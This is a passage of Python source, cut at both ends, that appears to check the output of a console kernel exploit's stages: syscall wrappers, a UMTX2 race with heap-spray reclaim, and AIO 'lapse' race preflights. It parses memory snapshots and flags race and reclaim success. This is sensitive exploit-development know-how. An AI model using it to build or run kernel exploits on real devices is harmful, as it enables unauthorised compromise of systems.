    need = 0x50 if args.wrapper_capture_errno else 0x40
    if len(data) < need:
        print(f"[check] wrapper-call short read: {len(data)} bytes need={need}")
        return False
    ret, wrapper = struct.unpack("<QQ", data[:0x10])
    supplied = struct.unpack("<" + "Q" * 6, data[0x10:0x40])
    print("[check] wrapper-call result:")
    print(f"  flavor={args.wrapper_flavor}")
    print(f"  source={args.wrapper_source}")
    print(f"  wrapper_offset=0x{args.wrapper_offset:X}")
    print(f"  use_libc_call8={int(bool(args.wrapper_use_libc_call8))} call8_send_self={int(bool(args.wrapper_call8_send_self))}")
    print(f"  use_setcontext={int(bool(args.wrapper_use_setcontext))}")
    print(f"  wrapper=0x{wrapper:016X}")
    print(f"  ret=0x{ret:016X}({signed_qword(ret)})")
    print("  supplied args:")
    for i, value in enumerate(supplied, 1):
        print(f"    arg{i}=0x{value:016X}({signed_qword(value)})")
    if args.wrapper_capture_errno:
        errno_ptr, errno_q = struct.unpack("<QQ", data[0x40:0x50])
        print(f"  errno_ptr=0x{errno_ptr:016X}")
        print(f"  errno=0x{errno_q & 0xFFFFFFFF:08X}({errno_q & 0xFFFFFFFF}) raw=0x{errno_q:016X}")
    extra = data[0x40:min(len(data), 0x100)]
    if args.wrapper_capture_errno:
        extra = data[0x50:min(len(data), 0x100)]
    if extra:
        base = 0x50 if args.wrapper_capture_errno else 0x40
        print(f"  msg+0x{base:X} hexdump:")
        for off in range(0, len(extra), 16):
            chunk = extra[off:off + 16]
            print(f"    +0x{base + off:04X}: {' '.join(f'{b:02X}' for b in chunk)}")
    return wrapper != 0


def check_direct_syscall(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    base_need = 0x50 if args.direct_syscall_sixargs else 0x40
    need = max(base_need, 0x60 if args.direct_syscall_capture_errno and args.direct_syscall_sixargs else 0x48 if args.direct_syscall_capture_errno else base_need)
    if len(data) < need:
        print(f"[check] direct-syscall short read: {len(data)} bytes need={need}")
        return False
    header_count = 10 if args.direct_syscall_sixargs else 7
    header = struct.unpack("<" + "Q" * header_count, data[:header_count * 8])
    ret, target, source, sysno = header[:4]
    supplied = header[4:]
    print("[check] direct-syscall result:")
    print(f"  flavor={args.direct_syscall_flavor}")
    print(f"  source={args.direct_syscall_source}")
    print(f"  landing_adjust=0x{args.direct_syscall_landing_adjust:X}")
    print(f"  sixargs={int(bool(args.direct_syscall_sixargs))}")
    print(f"  source_wrapper=0x{source:016X}")
    print(f"  syscall_target=0x{target:016X}")
    print(f"  sysno=0x{sysno:X}({sysno})")
    print(f"  ret=0x{ret:016X}({signed_qword(ret)})")
    print("  supplied args:")
    for i, value in enumerate(supplied, 1):
        print(f"    arg{i}=0x{value:016X}({signed_qword(value)})")
    if args.direct_syscall_capture_errno:
        errno_off = 0x50 if args.direct_syscall_sixargs else 0x38
        errno_ptr, errno_q = struct.unpack("<QQ", data[errno_off:errno_off + 0x10])
        print(f"  errno_ptr=0x{errno_ptr:016X}")
        print(f"  errno=0x{errno_q & 0xFFFFFFFF:08X}({errno_q & 0xFFFFFFFF}) raw=0x{errno_q:016X}")
    extra_base = 0x60 if args.direct_syscall_capture_errno and args.direct_syscall_sixargs else 0x50 if args.direct_syscall_sixargs else 0x48
    extra = data[extra_base:min(len(data), max(0x120, extra_base))]
    if extra:
        print(f"  msg+0x{extra_base:X} hexdump:")
        for off in range(0, len(extra), 16):
            chunk = extra[off:off + 16]
            print(f"    +0x{extra_base + off:04X}: {' '.join(f'{b:02X}' for b in chunk)}")
    if args.direct_syscall_num == 20:
        return target != 0 and 0 < ret < 0x100000
    return target != 0


def check_lapse_preflight(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    if len(data) < 0x170:
        print(f"[check] lapse-preflight short read: {len(data)} bytes")
        return False
    if data[:8] != b"LAPSEPF1":
        print(f"[check] lapse-preflight bad magic={data[:8]!r} len={len(data)}")
        return False
    syscall_target, source_wrapper, count = struct.unpack_from("<QQQ", data, 0x08)
    tests = [
        "getpid",
        "thr_self",
        "sched_yield",
        "mmap_rw",
        "cpuset_getaffinity",
        "rtprio_thread_get",
        "socket_inet6_dgram",
        "socketpair_unix_stream",
        "evf_create",
        "aio_multi_poll_empty",
        "aio_multi_cancel_empty",
        "aio_multi_delete_empty",
        "aio_multi_wait_empty",
        "aio_submit_cmd_empty",
        "aio_submit_cmd_active",
        "aio_multi_cancel_active",
        "aio_multi_poll_active",
        "aio_multi_delete_active",
    ]
    print("[check] Y2JB lapse preflight:")
    print(f"  source_wrapper=0x{source_wrapper:016X}")
    print(f"  syscall_target=0x{syscall_target:016X}")
    print(f"  count={count}")
    ok_core = True
    for i, name in enumerate(tests[:count]):
        ret = struct.unpack_from("<Q", data, 0x40 + i * 8)[0]
        signed = signed_qword(ret)
        sysno = struct.unpack_from("<Q", data, 0x100 + i * 8)[0]
        print(f"  {i:02d} {name:<24} sys=0x{sysno:X} ret=0x{ret:016X} ({signed})")
        if name in ("getpid", "mmap_rw") and ret in (0, 0xFFFFFFFFFFFFFFFF):
            ok_core = False
        if name == "sched_yield" and ret != 0:
            ok_core = False
    mask0, mask1 = struct.unpack_from("<QQ", data, 0x200)
    rtprio_type, rtprio_prio = struct.unpack_from("<HH", data, 0x210)
    sp0, sp1 = struct.unpack_from("<ii", data, 0x220)
    tid = struct.unpack_from("<Q", data, 0x260)[0]
    active_aio_id = struct.unpack_from("<I", data, 0x420)[0]
    active_aio_state = struct.unpack_from("<I", data, 0x450)[0]
    print(f"  cpuset_mask=0x{mask0:016X}:0x{mask1:016X} rtprio=({rtprio_type},{rtprio_prio})")
    print(f"  socketpair_fds=({sp0},{sp1}) tid=0x{tid:016X}")
    print(f"  active_aio_id=0x{active_aio_id:08X} active_aio_state=0x{active_aio_state:08X}")
    return ok_core


def check_umtx2_preflight(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    if len(data) < 0x370:
        print(f"[check] umtx2-preflight short read: {len(data)} bytes")
        return False
    if data[:8] != b"UMTX2PF!":
        print(f"[check] umtx2-preflight bad magic={data[:8]!r} len={len(data)}")
        return False

    syscall_target, source_wrapper = struct.unpack_from("<QQ", data, 0x08)
    create_fd = signed_qword(struct.unpack_from("<Q", data, 0x20)[0])
    ftruncate_ret = signed_qword(struct.unpack_from("<Q", data, 0x28)[0])
    lookup_fd = signed_qword(struct.unpack_from("<Q", data, 0x30)[0])
    fstat_ret = signed_qword(struct.unpack_from("<Q", data, 0x38)[0])
    destroy_ret = signed_qword(struct.unpack_from("<Q", data, 0x40)[0])
    close_create = signed_qword(struct.unpack_from("<Q", data, 0x48)[0])
    close_lookup = signed_qword(struct.unpack_from("<Q", data, 0x50)[0])
    errno_create = struct.unpack_from("<Q", data, 0x60)[0] if len(data) >= 0x68 else 0
    errno_lookup = struct.unpack_from("<Q", data, 0x70)[0] if len(data) >= 0x78 else 0
    errno_destroy = struct.unpack_from("<Q", data, 0x80)[0] if len(data) >= 0x88 else 0
    st_size = struct.unpack_from("<Q", data, 0x300 + 0x48)[0]
    key0, key1 = struct.unpack_from("<QQ", data, 0x200)

    print("[check] UMTX2 preflight:")
    print(f"  source_wrapper=0x{source_wrapper:016X} syscall_target=0x{syscall_target:016X}")
    print(f"  key=(0x{key0:016X},0x{key1:016X})")
    print(
        f"  create_fd={create_fd} ftruncate={ftruncate_ret} lookup_fd={lookup_fd} "
        f"fstat={fstat_ret} st_size=0x{st_size:X}"
    )
    print(f"  destroy={destroy_ret} close_create={close_create} close_lookup={close_lookup}")
    if errno_create or errno_lookup or errno_destroy:
        print(
            "  wrapper errno: "
            f"create={errno_create & 0xFFFFFFFF} "
            f"lookup={errno_lookup & 0xFFFFFFFF} "
            f"destroy={errno_destroy & 0xFFFFFFFF}"
        )
    return (
        syscall_target != 0
        and source_wrapper != 0
        and create_fd >= 0
        and ftruncate_ret == 0
        and lookup_fd >= 0
        and fstat_ret == 0
        and st_size >= 0x4000
        and destroy_ret == 0
    )


def check_umtx2_race_one(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    marker_off = data.rfind(b"UMTX2R1!")
    if marker_off > 0:
        print(f"[check] umtx2-race-one using last snapshot at +0x{marker_off:X} of raw len 0x{len(data):X}")
        data = data[marker_off:]
    if len(data) < 0x6C8:
        print(f"[check] umtx2-race-one short read: {len(data)} bytes")
        return False
    if data[:8] != b"UMTX2R1!":
        print(f"[check] umtx2-race-one bad magic={data[:8]!r} len={len(data)}")
        return False

    syscall_target, source_wrapper = struct.unpack_from("<QQ", data, 0x08)
    stage = struct.unpack_from("<Q", data, 0x18)[0]
    socketpair_ret = signed_qword(struct.unpack_from("<Q", data, 0x20)[0])
    spray_socketpair_ret = signed_qword(struct.unpack_from("<Q", data, 0x80)[0])
    thr_new = [signed_qword(struct.unpack_from("<Q", data, off)[0]) for off in (0x28, 0x30, 0x38)]
    create_fd = signed_qword(struct.unpack_from("<Q", data, 0x40)[0])
    ftruncate_ret = signed_qword(struct.unpack_from("<Q", data, 0x48)[0])
    close_create = signed_qword(struct.unpack_from("<Q", data, 0x50)[0])
    write_release = signed_qword(struct.unpack_from("<Q", data, 0x58)[0])
    fstat_ret = signed_qword(struct.unpack_from("<Q", data, 0x60)[0])
    close_lookup = signed_qword(struct.unpack_from("<Q", data, 0x68)[0])
    close_r = signed_qword(struct.unpack_from("<Q", data, 0x70)[0])
    close_w = signed_qword(struct.unpack_from("<Q", data, 0x78)[0])
    lookup_fd = signed_qword(struct.unpack_from("<Q", data, 0xA8)[0])
    lookup_ready = struct.unpack_from("<Q", data, 0xB0)[0]
    lookup_read = signed_qword(struct.unpack_from("<Q", data, 0xB8)[0])
    lookup_done = struct.unpack_from("<Q", data, 0xC0)[0]
    destroy0_ret = signed_qword(struct.unpack_from("<Q", data, 0xD0)[0])
    destroy0_ready = struct.unpack_from("<Q", data, 0xD8)[0]
    destroy0_read = signed_qword(struct.unpack_from("<Q", data, 0xE0)[0])
    destroy0_done = struct.unpack_from("<Q", data, 0xE8)[0]
    destroy1_ret = signed_qword(struct.unpack_from("<Q", data, 0xF8)[0])
    destroy1_ready = struct.unpack_from("<Q", data, 0x100)[0]
    destroy1_read = signed_qword(struct.unpack_from("<Q", data, 0x108)[0])
    destroy1_done = struct.unpack_from("<Q", data, 0x110)[0]
    yields_before = [signed_qword(struct.unpack_from("<Q", data, 0x120 + i * 8)[0]) for i in range(4)]
    yields_after = [signed_qword(struct.unpack_from("<Q", data, 0x140 + i * 8)[0]) for i in range(6)]
    main_affinity = [signed_qword(struct.unpack_from("<Q", data, off)[0]) for off in (0x170, 0x178)]
    cpuset_rets = [signed_qword(struct.unpack_from("<Q", data, off)[0]) for off in (0x180, 0x188, 0x190)]
    rtprio_rets = [signed_qword(struct.unpack_from("<Q", data, off)[0]) for off in (0x198, 0x1A0, 0x1A8)]
    inline_spray_count_raw = struct.unpack_from("<Q", data, 0x1B0)[0]
    inline_spray_count = max(0, min(int(inline_spray_count_raw), 16))
    inline_sizes = [struct.unpack_from("<Q", data, 0x1C0 + i * 8)[0] for i in range(inline_spray_count)]
    inline_fds = [signed_qword(struct.unpack_from("<Q", data, 0x220 + i * 8)[0]) for i in range(inline_spray_count)]
    inline_truncs = [signed_qword(struct.unpack_from("<Q", data, 0x260 + i * 8)[0]) for i in range(inline_spray_count)]
    inline_destroys = [signed_qword(struct.unpack_from("<Q", data, 0x2A0 + i * 8)[0]) for i in range(inline_spray_count)]
    st_size = struct.unpack_from("<Q", data, 0x300 + 0x48)[0] if fstat_ret == 0 else 0
    key0, key1 = struct.unpack_from("<QQ", data, 0x200)
    sp0, sp1 = struct.unpack_from("<ii", data, 0x400)
    read_fd_q, write_fd_q = struct.unpack_from("<QQ", data, 0x408)
    spray_sp0, spray_sp1 = struct.unpack_from("<ii", data, 0x4C0)
    spray_read_fd_q, spray_write_fd_q = struct.unpack_from("<QQ", data, 0x4C8)
    spray_release = signed_qword(struct.unpack_from("<Q", data, 0x1B8)[0])
    spray_gate_reads = [
        signed_qword(struct.unpack_from("<Q", data, 0x2D8)[0]),
        signed_qword(struct.unpack_from("<Q", data, 0x2F8)[0]),
    ]
    spray_post_yields = [signed_qword(struct.unpack_from("<Q", data, 0x580 + i * 8)[0]) for i in range(8)]
    inline_fd = signed_qword(struct.unpack_from("<Q", data, 0x6B0)[0])
    inline_ftruncate = signed_qword(struct.unpack_from("<Q", data, 0x6B8)[0])
    inline_destroy = signed_qword(struct.unpack_from("<Q", data, 0x6C0)[0])
    child_tids = []
    if len(data) >= 0x6A8:
        child_tids = [struct.unpack_from("<Q", data, off)[0] for off in (0x680, 0x690, 0x6A0)]

    print("[check] UMTX2 race-one:")
    print(f"  source_wrapper=0x{source_wrapper:016X} syscall_target=0x{syscall_target:016X} stage={stage}")
    print(f"  key=(0x{key0:016X},0x{key1:016X}) socketpair={socketpair_ret} fds=({sp0},{sp1}) q=({read_fd_q},{write_fd_q})")
    if spray_socketpair_ret or spray_sp0 or spray_sp1 or spray_release:
        print(
            f"  spray_gate socketpair={spray_socketpair_ret} fds=({spray_sp0},{spray_sp1}) "
            f"q=({spray_read_fd_q},{spray_write_fd_q}) release={spray_release} "
            f"reads={spray_gate_reads} post_yields={spray_post_yields}"
        )
    if child_tids:
        print(f"  thr_new={thr_new} child_tids=" + ",".join(f"0x{x:016X}" for x in child_tids))
    else:
        print(f"  thr_new={thr_new} child_tids=<not in checkpoint>")
    print(
        f"  create_fd={create_fd} ftruncate={ftruncate_ret} close_create={close_create} "
        f"write_release={write_release}"
    )
    print(
        f"  lookup fd={lookup_fd} ready={lookup_ready} read={lookup_read} done={lookup_done} "
        f"fstat={fstat_ret} st_size=0x{st_size:X} close={close_lookup}"
    )
    if inline_spray_count:
        sizes_s = ",".join(f"0x{x:X}" for x in inline_sizes)
        fds_s = ",".join(str(x) for x in inline_fds)
        trunc_s = ",".join(str(x) for x in inline_truncs)
        destroy_s = ",".join(str(x) for x in inline_destroys)
        print(
            f"  inline_spray count={inline_spray_count} sizes=[{sizes_s}] main_affinity={main_affinity}"
        )
        print(
            f"  inline_spray fds=[{fds_s}] ftruncate=[{trunc_s}] destroy=[{destroy_s}] "
            f"legacy_last=({inline_fd},{inline_ftruncate},{inline_destroy})"
        )
    print(
        f"  destroy0 ret={destroy0_ret} ready={destroy0_ready} read={destroy0_read} done={destroy0_done}"
    )
    print(
        f"  destroy1 ret={destroy1_ret} ready={destroy1_ready} read={destroy1_read} done={destroy1_done}"
    )
    print(f"  worker_setup cpuset={cpuset_rets} rtprio={rtprio_rets}")
    print(f"  close_barrier=({close_r},{close_w}) yields_before={yields_before} yields_after={yields_after}")
    race_signal = lookup_fd >= 0 and destroy0_ret == 0 and destroy1_ret == 0
    reclaim_signal = bool(inline_spray_count and fstat_ret == 0 and st_size in inline_sizes)
    print(f"  race_signal={'YES' if race_signal else 'no'} reclaim_signal={'YES' if reclaim_signal else 'no'}")
    if reclaim_signal:
        winner_idx = inline_sizes.index(st_size)
        print(f"  RECLAIM SIZE MATCH idx={winner_idx} fd={inline_fds[winner_idx]} size=0x{st_size:X}")
    mechanics_ok = (
        syscall_target != 0
        and source_wrapper != 0
        and socketpair_ret == 0
        and all(x == 0 for x in thr_new)
        and bool(child_tids)
        and all(x != 0 for x in child_tids)
        and create_fd >= 0
        and ftruncate_ret == 0
        and close_create == 0
        and write_release == 3
        and lookup_ready == 1
        and destroy0_ready == 1
        and destroy1_ready == 1
        and (lookup_read == 1 or lookup_fd >= 0)
        and (destroy0_read == 1 or destroy0_ret == 0)
        and (destroy1_read == 1 or destroy1_ret == 0)
        and (lookup_done == 1 or lookup_fd >= 0)
        and (destroy0_done == 1 or destroy0_ret == 0)
        and (destroy1_done == 1 or destroy1_ret == 0)
    )
    return mechanics_ok and race_signal and (reclaim_signal if inline_spray_count else True)


def check_umtx2_spray_existing(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    marker_off = -1
    search = 0
    while True:
        off = data.find(b"UMTX2SP!", search)
        if off < 0:
            break
        if len(data) - off >= 0x900:
            marker_off = off
        search = off + 1
    if marker_off > 0:
        print(f"[check] umtx2-spray-existing using last snapshot at +0x{marker_off:X} of raw len 0x{len(data):X}")
        data = data[marker_off:]
    if len(data) < 0x900:
        print(f"[check] umtx2-spray-existing short read: {len(data)} bytes")
        return False
    if data[:8] != b"UMTX2SP!":
        print(f"[check] umtx2-spray-existing bad magic={data[:8]!r} len={len(data)}")
        return False
    syscall_target, source_wrapper = struct.unpack_from("<QQ", data, 0x08)
    stage = struct.unpack_from("<Q", data, 0x18)[0]
    existing_fd, count_q = struct.unpack_from("<QQ", data, 0x20)
    count = max(1, min(int(count_q), 16, args.umtx2_spray_count))
    fstat_ret = signed_qword(struct.unpack_from("<Q", data, 0x30)[0])
    st_size = struct.unpack_from("<Q", data, 0x300 + 0x48)[0] if fstat_ret == 0 else 0
    sizes = [struct.unpack_from("<Q", data, 0x400 + i * 8)[0] for i in range(count)]
    fds = [signed_qword(struct.unpack_from("<Q", data, 0x500 + i * 8)[0]) for i in range(count)]
    truncs = [signed_qword(struct.unpack_from("<Q", data, 0x600 + i * 8)[0]) for i in range(count)]
    destroys = [signed_qword(struct.unpack_from("<Q", data, 0x680 + i * 8)[0]) for i in range(count)]
    closes = [signed_qword(struct.unpack_from("<Q", data, 0x780 + i * 8)[0]) for i in range(count)]
    match_idx = next((i for i, size in enumerate(sizes) if size == st_size), None)
    print("[check] UMTX2 spray-existing:")
    print(f"  source_wrapper=0x{source_wrapper:016X} syscall_target=0x{syscall_target:016X} stage=0x{stage:X}")
    print(f"  existing_fd={existing_fd} count={count} fstat={fstat_ret} st_size=0x{st_size:X}")
    print(f"  fds={fds}")
    print(f"  ftruncate={truncs}")
    print(f"  destroy={destroys}")
    print(f"  close={closes}")
    if match_idx is not None:
        print(f"  RECLAIM SIZE MATCH idx={match_idx} fd={fds[match_idx]} size=0x{sizes[match_idx]:X}")
    else:
        print("  reclaim size match=no")
    return (
        syscall_target != 0
        and source_wrapper != 0
        and fstat_ret == 0
        and match_idx is not None
        and fds[match_idx] >= 0
    )


def check_lapse_thread(raw_path, expect_marker=True, require_thread=True, require_libc=True):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    if len(data) < 0x620:
        print(f"[check] lapse-thread short read: {len(data)} bytes")
        return False
    if data[:8] != b"LAPSTH1!":
        print(f"[check] lapse-thread bad magic={data[:8]!r} len={len(data)}")
        return False
    syscall_target = struct.unpack_from("<Q", data, 0x08)[0]
    source_wrapper = struct.unpack_from("<Q", data, 0x10)[0]
    snapshot_stage = struct.unpack_from("<Q", data, 0x18)[0]
    libc_base = struct.unpack_from("<Q", data, 0x20)[0]
    longjmp_addr = struct.unpack_from("<Q", data, 0x28)[0]
    thr_new_ret = struct.unpack_from("<Q", data, 0x30)[0]
    marker = struct.unpack_from("<Q", data, 0x38)[0]
    child_tid = struct.unpack_from("<Q", data, 0x610)[0]
    parent_tid = struct.unpack_from("<Q", data, 0x618)[0]
    yields = [struct.unpack_from("<Q", data, 0x80 + i * 8)[0] for i in range(8)]
    expected_marker = 0x315348545350414C
    print("[check] Y2JB lapse thread preflight:")
    print(f"  source_wrapper=0x{source_wrapper:016X}")
    print(f"  syscall_target=0x{syscall_target:016X}")
    print(f"  libc_base=0x{libc_base:016X} longjmp=0x{longjmp_addr:016X}")
    print(f"  thr_new_ret=0x{thr_new_ret:016X}({signed_qword(thr_new_ret)})")
    print(f"  marker=0x{marker:016X} child_tid=0x{child_tid:016X} parent_tid=0x{parent_tid:016X}")
    print("  sched_yield returns=" + ",".join(f"0x{x:X}" for x in yields))
    return (
        syscall_target != 0
        and source_wrapper != 0
        and ((libc_base != 0 and longjmp_addr != 0) if require_libc else True)
        and (thr_new_ret == 0 if require_thread else True)
        and (marker == expected_marker if expect_marker else marker == 0)
        and (child_tid != 0 if require_thread else True)
    )


def check_lapse_worker(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    if len(data) < 0x620:
        print(f"[check] lapse-worker short read: {len(data)} bytes")
        return False
    if data[:8] != b"LAPSWK1!":
        print(f"[check] lapse-worker bad magic={data[:8]!r} len={len(data)}")
        return False
    syscall_target = struct.unpack_from("<Q", data, 0x08)[0]
    source_wrapper = struct.unpack_from("<Q", data, 0x10)[0]
    socketpair_ret = struct.unpack_from("<Q", data, 0x20)[0]
    submit_ret = struct.unpack_from("<Q", data, 0x30)[0]
    ready = struct.unpack_from("<Q", data, 0x38)[0]
    deleted = struct.unpack_from("<Q", data, 0x40)[0]
    thr_new_ret = struct.unpack_from("<Q", data, 0x48)[0]
    poll_ret = struct.unpack_from("<Q", data, 0x60)[0]
    cpuset_ret = struct.unpack_from("<Q", data, 0x80)[0]
    rtprio_ret = struct.unpack_from("<Q", data, 0x88)[0]
    worker_delete_ret = struct.unpack_from("<Q", data, 0x90)[0]
    yield0 = struct.unpack_from("<Q", data, 0xA0)[0]
    yield1 = struct.unpack_from("<Q", data, 0xA8)[0]
    pipe_r = struct.unpack_from("<i", data, 0x200)[0]
    pipe_w = struct.unpack_from("<i", data, 0x204)[0]
    req_fd = struct.unpack_from("<i", data, 0x220 + 0x20)[0]
    aio_id = struct.unpack_from("<I", data, 0x260)[0]
    poll_state = struct.unpack_from("<I", data, 0x270)[0]
    worker_state = struct.unpack_from("<I", data, 0x274)[0]
    child_tid = struct.unpack_from("<Q", data, 0x610)[0]
    parent_tid = struct.unpack_from("<Q", data, 0x618)[0]
    print("[check] Y2JB lapse worker preflight:")
    print(f"  source_wrapper=0x{source_wrapper:016X} syscall_target=0x{syscall_target:016X}")
    print(f"  socketpair_ret=0x{socketpair_ret:016X}({signed_qword(socketpair_ret)}) fds=({pipe_r},{pipe_w}) req_fd={req_fd}")
    print(f"  submit_ret=0x{submit_ret:016X}({signed_qword(submit_ret)}) aio_id=0x{aio_id:08X}")
    print(f"  thr_new_ret=0x{thr_new_ret:016X}({signed_qword(thr_new_ret)}) child_tid=0x{child_tid:016X} parent_tid=0x{parent_tid:016X}")
    print(f"  worker cpuset=0x{cpuset_ret:016X} rtprio=0x{rtprio_ret:016X} ready={ready} deleted={deleted}")
    print(f"  worker_delete_ret=0x{worker_delete_ret:016X}({signed_qword(worker_delete_ret)}) worker_state=0x{worker_state:08X}")
    print(f"  poll_ret=0x{poll_ret:016X}({signed_qword(poll_ret)}) poll_state=0x{poll_state:08X} yields=0x{yield0:X},0x{yield1:X}")
    return (
        syscall_target != 0
        and source_wrapper != 0
        and socketpair_ret == 0
        and pipe_r >= 0
        and pipe_w >= 0
        and req_fd == pipe_r
        and submit_ret == 0
        and aio_id != 0
        and thr_new_ret == 0
        and child_tid != 0
        and ready == 1
        and deleted == 1
        and rtprio_ret == 0
        and worker_delete_ret == 0
    )


def check_lapse_suspend(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    marker_off = data.rfind(b"LAPSSU1!")
    if marker_off > 0:
        print(f"[check] lapse-suspend using last snapshot at +0x{marker_off:X} of raw len 0x{len(data):X}")
        data = data[marker_off:]
    if len(data) < 0x620:
        print(f"[check] lapse-suspend short read: {len(data)} bytes")
        return False
    if data[:8] != b"LAPSSU1!":
        print(f"[check] lapse-suspend bad magic={data[:8]!r} len={len(data)}")
        return False
    syscall_target = struct.unpack_from("<Q", data, 0x08)[0]
    source_wrapper = struct.unpack_from("<Q", data, 0x10)[0]
    active_socketpair_ret = struct.unpack_from("<Q", data, 0x20)[0]
    barrier_socketpair_ret = struct.unpack_from("<Q", data, 0x28)[0]
    submit_ret = struct.unpack_from("<Q", data, 0x30)[0]
    ready = struct.unpack_from("<Q", data, 0x38)[0]
    deleted = struct.unpack_from("<Q", data, 0x40)[0]
    thr_new_ret = struct.unpack_from("<Q", data, 0x48)[0]
    write_ret = struct.unpack_from("<Q", data, 0x50)[0]
    suspend_ret = struct.unpack_from("<Q", data, 0x58)[0]
    poll_ret = struct.unpack_from("<Q", data, 0x60)[0]
    resume_ret = struct.unpack_from("<Q", data, 0x68)[0]
    cpuset_ret = struct.unpack_from("<Q", data, 0x80)[0]
    rtprio_ret = struct.unpack_from("<Q", data, 0x88)[0]
    worker_read_ret = struct.unpack_from("<Q", data, 0x90)[0]
    worker_delete_ret = struct.unpack_from("<Q", data, 0x98)[0]
    yields_before = [struct.unpack_from("<Q", data, 0xA8 + i * 8)[0] for i in range(4)]
    yield_after_write = struct.unpack_from("<Q", data, 0xC8)[0]
    yields_after = [struct.unpack_from("<Q", data, 0xD0 + i * 8)[0] for i in range(6)]
    active_r = struct.unpack_from("<i", data, 0x200)[0]
    active_w = struct.unpack_from("<i", data, 0x204)[0]
    barrier_r = struct.unpack_from("<i", data, 0x208)[0]
    barrier_w = struct.unpack_from("<i", data, 0x20C)[0]
    read_fd_qword = struct.unpack_from("<Q", data, 0x210)[0]
    write_fd_qword = struct.unpack_from("<Q", data, 0x218)[0]
    req_fd = struct.unpack_from("<i", data, 0x220 + 0x20)[0]
    aio_id = struct.unpack_from("<I", data, 0x260)[0]
    poll_state = struct.unpack_from("<I", data, 0x270)[0]
    worker_state = struct.unpack_from("<I", data, 0x274)[0]
    child_tid = struct.unpack_from("<Q", data, 0x610)[0]
    parent_tid = struct.unpack_from("<Q", data, 0x618)[0]
    print("[check] Y2JB lapse suspend preflight:")
    print(f"  source_wrapper=0x{source_wrapper:016X} syscall_target=0x{syscall_target:016X}")
    print(
        "  active_socketpair="
        f"0x{active_socketpair_ret:016X}({signed_qword(active_socketpair_ret)}) "
        f"fds=({active_r},{active_w}) req_fd={req_fd}"
    )
    print(
        "  barrier_socketpair="
        f"0x{barrier_socketpair_ret:016X}({signed_qword(barrier_socketpair_ret)}) "
        f"fds=({barrier_r},{barrier_w}) read_slot={read_fd_qword} write_slot={write_fd_qword}"
    )
    print(f"  submit_ret=0x{submit_ret:016X}({signed_qword(submit_ret)}) aio_id=0x{aio_id:08X}")
    print(f"  thr_new_ret=0x{thr_new_ret:016X}({signed_qword(thr_new_ret)}) child_tid=0x{child_tid:016X} parent_tid=0x{parent_tid:016X}")
    print(f"  worker cpuset=0x{cpuset_ret:016X} rtprio=0x{rtprio_ret:016X} ready={ready}")
    print(f"  write_ret=0x{write_ret:016X}({signed_qword(write_ret)}) yield_after_write=0x{yield_after_write:X}")
    print(f"  suspend_ret=0x{suspend_ret:016X}({signed_qword(suspend_ret)})")
    print(f"  poll_ret=0x{poll_ret:016X}({signed_qword(poll_ret)}) poll_state=0x{poll_state:08X}")
    print(f"  resume_ret=0x{resume_ret:016X}({signed_qword(resume_ret)})")
    print(f"  worker_read_ret=0x{worker_read_ret:016X}({signed_qword(worker_read_ret)})")
    print(f"  deleted={deleted} worker_delete_ret=0x{worker_delete_ret:016X}({signed_qword(worker_delete_ret)}) worker_state=0x{worker_state:08X}")
    print("  yields_before=" + ",".join(f"0x{x:X}" for x in yields_before))
    print("  yields_after=" + ",".join(f"0x{x:X}" for x in yields_after))
    return (
        syscall_target != 0
        and source_wrapper != 0
        and active_socketpair_ret == 0
        and barrier_socketpair_ret == 0
        and active_r >= 0
        and active_w >= 0
        and barrier_r >= 0
        and barrier_w >= 0
        and req_fd == active_r
        and read_fd_qword == barrier_r
        and write_fd_qword == barrier_w
        and submit_ret == 0
        and aio_id != 0
        and thr_new_ret == 0
        and child_tid != 0
        and ready == 1
        and rtprio_ret == 0
        and signed_qword(write_ret) == 1
        and signed_qword(suspend_ret) >= 0
        and signed_qword(resume_ret) >= 0
        and signed_qword(worker_read_ret) == 1
        and deleted == 1
        and worker_delete_ret == 0
    )


def check_lapse_race_one(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    marker_off = data.rfind(b"LAPSR11!")
    if marker_off > 0:
        print(f"[check] lapse-race-one using last snapshot at +0x{marker_off:X} of raw len 0x{len(data):X}")
        data = data[marker_off:]
    if len(data) < 0x700:
        print(f"[check] lapse-race-one short read: {len(data)} bytes")
        return False
    if data[:8] != b"LAPSR11!":
        print(f"[check] lapse-race-one bad magic={data[:8]!r} len={len(data)}")
        return False

    syscall_target = struct.unpack_from("<Q", data, 0x08)[0]
    source_wrapper = struct.unpack_from("<Q", data, 0x10)[0]
    ret_names = (
        ("socket_listen", 0x20),
        ("setsockopt_reuse", 0x28),
        ("bind", 0x30),
        ("getsockname", 0x38),
        ("listen", 0x40),
        ("socket_client", 0x48),
        ("connect", 0x50),
        ("accept", 0x58),
        ("setsockopt_linger", 0x60),
        ("aio_submit", 0x68),
        ("aio_cancel_all", 0x70),
        ("aio_poll_all", 0x78),
        ("close_client", 0x80),
        ("barrier_socketpair", 0x88),
        ("thr_new", 0x90),
        ("write_barrier", 0x98),
        ("thr_suspend", 0xA0),
        ("aio_poll_target", 0xA8),
        ("getsockopt_tcp_info", 0xB0),
        ("main_delete", 0xB8),
        ("thr_resume", 0xC0),
        ("close_conn", 0xC8),
        ("close_listen", 0xD0),
        ("worker_ready", 0xD8),
        ("worker_cpuset", 0xE0),
        ("worker_rtprio", 0xE8),
        ("worker_read", 0xF0),
        ("worker_delete", 0xF8),
        ("worker_deleted", 0x100),
        ("worker_exit", 0x108),
    )
    vals = {name: struct.unpack_from("<Q", data, off)[0] for name, off in ret_names}
    yields_before = [struct.unpack_from("<Q", data, 0x110 + i * 8)[0] for i in range(4)]
    yields_after = [struct.unpack_from("<Q", data, 0x130 + i * 8)[0] for i in range(6)]
    listen_fd = signed_qword(vals["socket_listen"])
    client_fd = signed_qword(vals["socket_client"])
    conn_fd = signed_qword(vals["accept"])
    port_be = int.from_bytes(data[0x202:0x204], "big")
    addr_len = struct.unpack_from("<I", data, 0x214)[0]
    barrier_r = struct.unpack_from("<i", data, 0x228)[0]
    barrier_w = struct.unpack_from("<i", data, 0x22C)[0]
